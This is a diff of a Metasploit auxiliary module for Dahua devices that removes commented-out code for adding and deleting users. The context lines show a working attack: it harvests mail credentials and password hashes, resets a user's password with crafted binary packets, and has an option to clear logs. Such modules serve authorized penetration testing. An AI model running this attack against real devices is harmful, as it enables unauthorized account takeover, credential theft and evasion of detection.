@@ -98,7 +98,6 @@ class Metasploit3 < Msf::Auxiliary
             mpass = "#{data[6]}"
             mailserver = "#{mailhost[0]}"
             print_good("MailServer: #{mailserver}")
-            # destemail = "#{data[1]}" if !mailhost[1].nil?
             if !mailserver.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
               report_email_creds(mailserver, rport, muser, mpass) if !mailserver.nil? && !muser.nil? && !mpass.nil?
             end
@@ -178,7 +177,6 @@ class Metasploit3 < Msf::Auxiliary
           hash = "#{rhost} #{username}:$dahua$#{md5hash}"
           report_hash(ip, rport, user, hash)
           # Write the vulnerability to the database
-          # unless reported_vuln
           report_vuln(
             host: rhost,
             port: rport,
@@ -205,85 +203,14 @@ class Metasploit3 < Msf::Auxiliary
         u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + userstring
         sock.put(u1)
-        # data = sock.get(1024)
         sock.put(u2)
-        # data = sock.get(1024)
         sock.put(u3)
         data = sock.get(1024)
         sock.put(u1)
         if data = sock.get(1024)
           print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
         end
-# 			elsif (datastore['ACTION'] == "DELETE")
-# 				u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
-# 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-# 				u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" +
-# 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-# 				delete = "\xa6\x00\x00\x00#{datastore['USERNAME'].length.chr}\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" +
-# 					 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-# 					 datastore['USERNAME']
-# 				print delete
-# 				sock.send(u1, 0)
-# 				sock.get_once
-# 				sock.send(delete, 0)
-# 				sock.get_once
-# 				sock.send(u2, 0)
-# 				sock.get_once
-#
-#
-# 			elsif (datastore['ACTION'] == "ADD")
-#                               userstring = (usercount + 1).to_s + ":" + datastore['USERNAME'] + ":" + datastore['PASSWORD']
-# 				userstring << "\x3a\x31\x3a\x31\x2c\x32\x2c\x33\x2c\x34\x2c\x35\x2c\x36\x2c\x37" +
-# 				     "\x2c\x38\x2c\x39\x2c\x31\x30\x2c\x31\x31\x2c\x32\x30\x2c\x32\x31" +
-# 				     "\x2c\x32\x32\x2c\x32\x33\x2c\x32\x34\x2c\x32\x35\x2c\x32\x36\x2c" +
-# 				     "\x32\x37\x2c\x32\x38\x2c\x33\x37\x2c\x33\x38\x2c\x33\x39\x2c\x34" +
-# 				     "\x30\x2c\x34\x32\x2c\x34\x33\x2c\x34\x34\x2c\x34\x35\x2c\x34\x36" +
-# 				     "\x2c\x34\x37\x2c\x34\x38\x2c\x34\x39\x2c\x35\x30\x2c\x35\x31\x2c" +
-# 				     "\x35\x32\x2c\x35\x33\x2c\x35\x34\x2c\x35\x35\x2c\x35\x36\x2c\x35" +
-# 				     "\x37\x2c\x35\x38\x2c\x35\x39\x2c\x36\x30\x3a\x3a\x31"
-#
-# 				u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" +
-# 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-# 				u3 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
-# 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-# 				u4 = "\xa6\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" +
-# 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-# 				u5 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00" +
-# 				     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-# 				     userstring
-# 				sock.put(u1)
-# 				sock.get(1024)
-# 				sock.put(u1)
-# 				sock.get(1024)
-# 				sock.put(u2)
-# 				sock.get(1024)
-# 				sock.put(u3)
-# 				sock.get(1024)
-# 				sock.put(u2)
-# 				sock.get(1024)
-# 				sock.put(u3)
-# 				sock.get(1024)
-# 				sock.put(u4)
-# 				sock.get(1024)
-# 				sock.put(groups)
-# 				sock.get(1024)
-# 				sock.put(users)
-# 				sock.get(1024)
-# 				sock.put(u5)
-# 				sock.get(1024)
-# 				sock.put(u2)
-# 				sock.get(1024)
-# 				sock.put(u3)
-# 				sock.get(1024)
-# 				sock.put(u4)
-# 				sock.put(1024)
-# 				sock.put(groups)
-# 				sock.get(1024)
-# 				sock.put(users)
-# 				sock.put(1024)
-# 				print_good("ADDED USER!: user #{datastore['USERNAME']}'s password is #{datastore['PASSWORD']}")
-#
-# else
+
       end
 
       if datastore['CLEAR_LOGS']
